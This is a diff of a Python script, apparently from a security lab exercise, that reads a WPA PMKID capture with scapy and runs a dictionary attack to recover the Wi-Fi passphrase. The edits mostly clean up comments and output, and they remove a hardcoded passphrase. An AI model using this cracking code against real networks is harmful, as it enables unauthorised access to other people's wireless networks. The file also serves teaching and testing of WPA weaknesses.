@@ -25,19 +25,12 @@ from numpy import array
 import hmac, hashlib
 
 
-# Read capture file -- it contains beacon, authentication, associacion, handshake and data
+# Read capture file -- it contains beacon, authentication, association, handshake and data
 wpa=rdpcap("PMKID_handshake.pcap") 
 
-# Important parameters for key derivation - most of them can be obtained from the pcap file
-passPhrase  = "admin123"
-A           = "Pairwise key expansion" #this string is used in the pseudo-random function
+# Retrieve values contained in the capture
 
-
-
-# Récupération des valeurs pouvant être trouvée dans la capture
-# le ssid peut être récupéré dans le premier paquet de la capture
-
-# Get SSID from a near beacon
+# Get SSID from a beacon near 4-way handshake
 ssid = wpa[144].info
 # Get AP mac address from the first packet of 4-way handshake
 APmac = a2b_hex(wpa[145].addr2.replace(":","").lower()) 
@@ -47,9 +40,10 @@ Clientmac = a2b_hex(wpa[145].addr1.replace(":","").lower())
 PmkidToTest= hexlify(wpa[145].load)[202:234]
 pmkName = "PMK Name".encode()
 
-#Boolean to know if passphrase is found or not
+# Boolean to know if passphrase is found or not
 foundPassphrase = False
 
+# Loop on every word contained in dico.txt
 with open('dico.txt') as f:
     for passPhrase in f:
         if(passPhrase[-1] == '\n'):
@@ -58,15 +52,14 @@ with open('dico.txt') as f:
         # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
         pmk = pbkdf2(hashlib.sha1, passPhrase.encode(), ssid, 4096, 32)
        
-       
+        # compute pmkid
         pmkid = str.encode(hmac.new(pmk, pmkName + APmac + Clientmac, hashlib.sha1).hexdigest()[:32])
 
-
-        # if the computed MIC matches the given MIC, we're done, otherwise, we loop again
+        # if the computed PMKID matches the given PMKID, we're done, otherwise, we loop again
         if (PmkidToTest == pmkid):
             foundPassphrase=True
             
-            print ("\n\npassPhrase found, value : ", passPhrase , "\n")
+            print ("\npassPhrase found, value : ", passPhrase , "\n")
             print ("Values used to derivate keys")
             print ("============================")
             print ("Passphrase: \t",passPhrase ,"\n")
@@ -78,8 +71,8 @@ with open('dico.txt') as f:
             print ("=============================")
 
             print ("PMK:\t\t",pmk.hex() ,"\n")
-            print ("PMKID:\t\t", pmkid ,"\n")
-            print ("PMKID_to_test:\t", PmkidToTest ,"\n")
+            print ("PMKID:\t\t", pmkid.decode() ,"\n")
+            print ("PMKID_to_test:\t", PmkidToTest.decode() ,"\n")
         
 if(foundPassphrase == False):
     print ("\npassPhrase not found in dico\n")
